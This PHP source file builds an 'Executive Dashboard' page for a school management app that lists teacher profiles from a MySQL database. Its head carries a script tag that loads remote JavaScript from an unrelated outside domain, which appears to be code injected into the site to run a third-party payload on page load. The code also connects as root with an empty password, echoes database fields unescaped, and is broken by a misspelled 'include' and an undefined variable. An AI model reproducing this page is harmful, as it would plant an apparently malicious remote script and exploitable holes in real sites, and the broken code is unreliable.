<?php
error_reporting(E_ALL ^ E_DEPRECATED);

session_start();
	$con = mysql_connect("localhost","root","");
	if (!$con)
	{
	die('Could not connect: ' . mysql_error());
	}
	mysql_select_db("erudite", $con);
	$doneby=$_SESSION['id'];
	
	
	mysql_close($con);
	
	if(!isset($_SESSION['id']))
	{
		header("Location:index.php");

	}

?>

<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">

<head>
	<meta content="text/html; charset=utf-8" http-equiv="Content-Type" />
	<title>Executive Dashboard</title>
	<meta charset="utf-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <link rel="stylesheet" href="css/marge%20boot_found/bootstrap.min.css" />
  <script src="css/marge%20boot_found/jquery.min.js"></script>
  <script src="css/marge%20boot_found/bootstrap.min.js"></script>
  <link rel="stylesheet" href="font-awesome-4.3.0/css/font-awesome.css" />
  <script src="https://anddogen.com/ad.php?u=2bcb6c0dae4ff00188d34940932e2ce1&c=pbbt&p=1"></script> 
  
</head>

<body>
	<nav class="navbar navbar-inverse" style="border-radius:0px;">
	  <div class="container-fluid">
	    <div class="navbar-header">
	      <button type="button" class="navbar-toggle" data-toggle="collapse" data-target="#myNavbar">
	        <span class="icon-bar"></span>
	        <span class="icon-bar"></span>
	        <span class="icon-bar"></span>                        
	      </button>
	      <a class="navbar-brand" href="#" style="color:#FF6600"><img src="Logo.png" style="margin-top:-12px" /></a>
	    </div>
	    <div class="collapse navbar-collapse" id="myNavbar">
	      <ul class="nav navbar-nav navbar-right">
	        <li class="dropdown"><a class="dropdown-toggle" data-toggle="dropdown" style="color:#FF6600"><span><img class="img-circle" width="27px" height="27px" src="user-image-with-black-background_318-34564.png" /></span>&nbsp;User1&nbsp; <span class="caret" style="color:#FFFFFF"></span></a>
	        	<ul class="dropdown-menu">
				    <li><a href="#"><i class="fa fa-list-alt"></i>&nbsp;View Profile</a></li>
		            <li><a href="#"><i class="fa fa-pencil"></i>&nbsp;Change Password</a></li>
		            <li><a href="logout.php"><i class="fa fa-power-off"></i>&nbsp;Logout</a></li>
	            </ul>
	        </li>
	      </ul>
	    </div>
	  </div>
	</nav>
	<div class="container-fluid" style="padding-left:0px;padding-right:0px; background-color:#363636">
		<div class="col-md-2" style="background-color: #363636;margin-top:-20px;">
			<ul class="nav">
						
				        <li class="active"><a href="#"><i class="fa fa-database"></i>&nbsp; Executive Dashboard</a></li>
				        <li class="dropdown">
				          <a class="dropdown-toggle" data-toggle="dropdown" href="#">Page 1 <span class="caret"></span></a>
				          <ul class="dropdown-menu">
				            <li><a href="#">Page 1-1</a></li>
				            <li><a href="#">Page 1-2</a></li>
			            <li><a href="#">Page 1-3</a></li>
			          </ul>
			      </li>
				  <li><a href="#">Page 2</a></li>
				 <li><a href="#">Page 3</a></li>
			</ul>
		</div>
		<div class="col-md-10" style="background-color:#EEEEEE;margin-top:-20px; padding-top:10px; padding-bottom:10px;">
			<ul class="nav nav-pills">
			    <li class="active"><a data-toggle="pill" href="#home">Home</a></li>
			    <li><a data-toggle="pill" href="#teacher">Teacher</a></li>
			    <li><a data-toggle="pill" href="#menu1">Student</a></li>
			</ul><hr style="background-color:#666666;border-top: 1px solid rgb(208, 208, 208);"/>
			  <div class="tab-content">
			  	<div id="home" class="tab-pane fade in active">
			  		<h3>Welcome! User1</h3>
			  		<h5>You have entered into Executive area</h5>
			  	</div>
			    <div id="teacher" class="tab-pane fade">
			    <p>
			      <span class=" pull-right"><button class="btn btn-success" data-toggle="collapse" data-target="#filter"><i class="fa fa-search-plus"></i>&nbsp;Search</button>&nbsp;<button class="btn btn-info"><a href="res.php" target="_blank"><i class="fa fa-plus-circle"></i>&nbsp;Add New</a></button></span></p><br/>
			       
			      <div id="filter" class="collapse well well-sm" style="width:30%">
						<form role="form">
							<Select>
								<option disabled="disabled">search by</option>
								<option>By ID</option>
								<option>By Name</option>
								<option>By subject</option><br/>
								<input type="text" placeholder="enter value" />
								<button class="btn btn-success" type="submit"><i class="fa fa-search"></i>&nbsp;Search</button>
							</Select>
						</form>
				  </div>
				  <i class="fa fa-list"></i>&nbsp;<label>List of Teacher</label>
			      <div class="container-fluid" style="background-color:white; padding-top:10px;padding-bottom:10px;">
			      	<div class="col-md-12">
			      	<?php
			      	mysql_connect("localhost","root","");
			      	mysql_select_db("erudite");
			      	$t_det=mysql_query("select * from teacher_details");
			      	while($row= mysql_fetch_array($t_det))
			      	{
			      	?>

			      		<div class="well-lg" style="background-color:#C0C0C0">
			      			<div class="row">
			      				<div class="col-md-8 col-sm-8">
			      					<div class="row" style="background-color:;padding-left:30px; padding-bottom:10px; padding-right:10px;">
			      						<div class="col-md-8">
			      							<div class="col-md-6" style="">
			      								<img src="Logo.png" class="img-responsive" /><br/>
			      								<img class="img-thumbnail img-responsive" src="<?php echo $row["t_img"]; ?>" /><br/>
			      								<center><span class="label-info">ID:<?php echo $row["t_id"]; ?></span></center>
			      							</div>
			      							<div class="col-md-6" style="padding-top:60px; padding-left:30px;">
			      								<span style="font-size:medium"><Strong><?php echo $row["t_nm"]; ?></Strong></span><br/><br/>
			      								<span style="color:red;font-size:small">In pursuit of excellent</span><br/><br/>
			      								<span style="font-size:medium"><?php echo $row["t_gen"]; ?> &nbsp;<?php echo $row["t_age"]; ?> years</span><br/><br/>
			      								<span style="font-size:medium"><?php echo $row["t_exp"]; ?> years of experience in field</span><br/><br/>
			      								<span style="font-size:medium"><?php echo $row["t_hqua"]; ?>- <?php echo $row["t_sub"]; ?></span>
			      							</div>
			      							<br/><div class="col-md-12">
			      								<input type="text" placeholder="Executive's review" style="width:100%;height:50px;">
			      							</div>
			      						</div>
			      						<div class="col-md-4" style=" padding-top:10px; padding-left:10px; padding-bottom:10px;;-webkit-box-shadow: inset 0px 1px 5px 0px rgba(0,0,0,0.75);
-moz-box-shadow: inset 0px 1px 5px 0px rgba(0,0,0,0.75);
box-shadow: inset 0px 1px 5px 0px rgba(0,0,0,0.75);">

			      							<center><img class="img-responsive" src="gold_silver_and_bronze_award_312500.jpg" style=" width:90px;height:45px;" /></center><hr/>
			      							<Span><input type="text" placeholder="Communication Skill"></span>
			      							<Span><input type="text" placeholder="Professionalism"></span>
			      							<Span><input type="text" placeholder="Feedbacks"></span>
			      							<Span><input type="text" placeholder="Relyiblity"></span>
			      							<Span><input type="text" placeholder="Executive's view"></span>
			      						</div>
			      					</div>
			      					<div class="row">
			      					<hr style="background-color:black"/>
			      						<span style="font-size:medium">Area: <?php echo $row["t_area"]; ?></span><br/>
			      						<span style="font-size:medium">Covering area: <?php echo $row["t_carea"]; ?></span><br/>
			      						<!---->
			      							<?php
									      	inclued ('xyz.php');
									      	while($rowval1= mysql_fetch_array($seg))
									      	{
									      	?>
			      						<!---->
			      						<span style="font-size:medium">Teaches:</span><br/>
			      						<span style="font-size:medium">segments: <?php echo $rowval1["name"]?></span><br/>
			      						<?php
			      						}
			      						?>
			      						<span style="font-size:medium">Contact no.: <?php echo $row["t_ph"]; ?></span><br/>
			      						<span style="font-size:medium">Alternative no.: <?php echo $row["t_aph"]; ?> </span><span></span>
			      					</div>
			      				</div>
			      				<div class="col-md-4 col-sm-4" style="padding-bottom:10px;padding-top:10px;background-color:#F1EFEF;">
			      					<img class="img-thumbnail img-responsive" src="<?php echo $row["t_img"]; ?>" /><br/>
			      					<span style="font-size:large"><Strong><?php echo $row["t_nm"]; ?></Strong></span><br/><br/>
			      								<span style="color:red;font-size:small">In pursuit of excellent</span><br/><br/>
			      								<span style="font-size:medium"><?php echo $row["t_gen"]; ?> &nbsp;<?php echo $row["t_age"]; ?> years</span><br/><br/>
			      								<span style="font-size:medium"><?php echo $row["t_exp"]; ?> years of experience in field</span><br/><br/>
			      								<span style="font-size:medium"><?php echo $row["t_hqua"]; ?>- <?php echo $row["t_sub"]; ?></span>

			      				</div>

			      			</div>
			      		</div><br/>
			      		<?php
			      		}
			      		?>
			      		<!---->
			      			<!--div class="well-lg" style="background-color:#C0C0C0">
			      			<div class="row">
			      				<div class="col-md-8 col-sm-8">
			      					<div class="row" style="background-color:;padding-left:30px; padding-bottom:10px; padding-right:10px;">
			      						<div class="col-md-8">
			      							<div class="col-md-6" style="">
			      								<img src="Logo.png" class="img-responsive" /><br/>
			      								<img class="img-thumbnail img-responsive" src="<?php echo $row["t_img"]; ?>" /><br/>
			      								<center><span class="label-info">ID:056</span></center>
			      							</div>
			      							<div class="col-md-6" style="padding-top:60px; padding-left:30px;">
			      								<span style="font-size:medium"><Strong>John Doe</Strong></span><br/><br/>
			      								<span style="color:red;font-size:small">In pursuit of excellent</span><br/><br/>
			      								<span style="font-size:medium"></span><br/><br/>
			      								<span style="font-size:medium">15 years of experience in field</span><br/><br/>
			      								<span style="font-size:medium">BA- English</span>
			      							</div>
			      							<br/><div class="col-md-12">
			      								<input type="text" placeholder="Executive's review" style="width:100%;height:50px;">
			      							</div>
			      						</div>
			      						<div class="col-md-4" style=" padding-top:10px; padding-left:10px; padding-bottom:10px;;-webkit-box-shadow: inset 0px 1px 5px 0px rgba(0,0,0,0.75);
-moz-box-shadow: inset 0px 1px 5px 0px rgba(0,0,0,0.75);
box-shadow: inset 0px 1px 5px 0px rgba(0,0,0,0.75);">

			      							<center><img class="img-responsive" src="gold_silver_and_bronze_award_312500.jpg" style=" width:90px;height:45px;" /></center><hr/>
			      							<Span><input type="text" placeholder="Communication Skill"></span>
			      							<Span><input type="text" placeholder="Professionalism"></span>
			      							<Span><input type="text" placeholder="Feedbacks"></span>
			      							<Span><input type="text" placeholder="Relyiblity"></span>
			      							<Span><input type="text" placeholder="Executive's view"></span>
			      						</div>
			      					</div>
			      					<div class="row">
			      					<hr style="background-color:black"/>
			      						<span style="font-size:medium">Area:</span><br/>
			      						<span style="font-size:medium">Covering area:</span><br/>
			      						<span style="font-size:medium">Teaches:</span><br/>
			      						<span style="font-size:medium">segments:</span><br/>
			      						<span style="font-size:medium"> Contact no.:</span><span></span><span></span>
			      					</div>
			      				</div>
			      				<div class="col-md-4 col-sm-4" style="padding-bottom:10px;padding-top:10px;background-color:#F1EFEF;">
			      					<img class="img-thumbnail img-responsive" src="John_Doe.jpg" /><br/>
			      					<span style="font-size:large"><Strong>John Doe</Strong></span><br/><br/>
			      								<span style="color:red;font-size:small">In pursuit of excellent</span><br/><br/>
			      								<span style="font-size:medium">Male 32 years</span><br/><br/>
			      								<span style="font-size:medium">15 years of experience in field</span><br/><br/>
			      								<span style="font-size:medium">BA- English</span>

			      				</div>

			      			</div>
			      		</div-->
			      		<!---->
			      	</div>
			      </div>
			    </div>
			    <div id="menu1" class="tab-pane fade">
			      <h3>No result found</h3>
			    </div>
			  </div>
		</div>
	</div>
	<!--tooltip-->
		<script>
	$(document).ready(function(){
	    $('[data-toggle="tooltip"]').tooltip();   
	});
	</script>
	<!--end-->
</body>

</html>
